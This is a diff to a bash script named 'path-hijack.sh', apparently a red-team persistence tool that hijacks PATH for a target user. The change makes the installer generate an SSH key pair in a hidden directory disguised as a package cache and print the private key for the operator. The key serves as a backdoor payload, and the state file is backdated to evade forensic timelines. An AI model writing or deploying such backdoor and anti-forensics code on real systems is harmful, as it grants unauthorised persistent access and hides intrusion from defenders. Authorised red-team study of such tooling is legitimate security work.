@@ -310,9 +310,19 @@ cmd_install() {
     done
 
     if [[ -z "$ssh_key" ]]; then
-        warn "No --key provided; SSH key payload will be a placeholder"
-        warn "Run: ./path-hijack.sh install --key 'ssh-ed25519 AAAA...' ..."
-        ssh_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderReplaceBeforeDeployment rt-ph"
+        local gen_key="/var/cache/.syspkg/path-hijack_id_ed25519"
+        mkdir -p /var/cache/.syspkg; chmod 700 /var/cache/.syspkg
+        if [[ ! -f "${gen_key}.pub" ]]; then
+            ssh-keygen -t ed25519 -f "$gen_key" -N "" -C "rt-ph" -q
+        fi
+        ssh_key=$(cat "${gen_key}.pub")
+        info "Generated SSH key: $gen_key"
+        info "Public key: $ssh_key"
+        echo
+        warn "╔══ SAVE THIS PRIVATE KEY ══════════════════════════════════╗"
+        cat "$gen_key"
+        warn "╚═══════════════════════════════════════════════════════════╝"
+        echo
     fi
 
     # ── resolve bin dir and command list ──────────────────────────────────────
@@ -448,11 +458,12 @@ EOF
     {
         echo "level=${level}"
         echo "bin_dir=${bin_dir}"
-        echo "commands=${deployed_cmds[*]}"
+        echo "commands=\"${deployed_cmds[*]}\""
         echo "path_mod_file=${path_mod_file}"
         echo "path_injected=${path_injected}"
         echo "target_user=${target_user}"
         echo "payload_lvl=${payload_lvl}"
+        echo "ssh_key_file=${gen_key:-}"
     } > "$STATE_FILE"
     chmod 600 "$STATE_FILE"
     touch -t 202004150830 "$STATE_FILE"
